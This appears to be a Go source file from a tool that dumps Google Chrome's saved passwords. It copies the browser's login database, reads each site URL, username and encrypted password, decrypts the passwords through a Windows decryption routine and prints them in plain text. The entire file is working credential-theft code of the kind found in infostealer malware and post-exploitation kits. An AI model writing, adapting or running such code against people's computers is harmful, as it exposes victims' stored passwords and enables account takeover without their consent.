package core

import (
	"Browser/crypher"
	"Browser/data"
	"fmt"
)

func ChromeSQLite() {
	if CopyFile(ReturnChrome(), data.LocalDB) {
		conn := ConnSQLite(data.LocalDB)
		if conn != nil {
			rows := QuerySQLite(conn, `SELECT origin_url, username_value, password_value FROM logins`)
			if rows != nil {
				for rows.Next() {
					var Url string
					var UserName string
					var PassWord []byte
					err := rows.Scan(&Url, &UserName, &PassWord)
					if err != nil {
						continue
					}
					DePwd, err := crypher.WinDecypt(PassWord)
					if UserName == "" || string(DePwd) == "" {
						continue
					} else {
						fmt.Println("[+]:",Url)
						fmt.Println("[UserName]:",UserName)
						fmt.Println("[Password]:",string(DePwd))
						fmt.Println("")
					}
				}
			}
		}
	}
}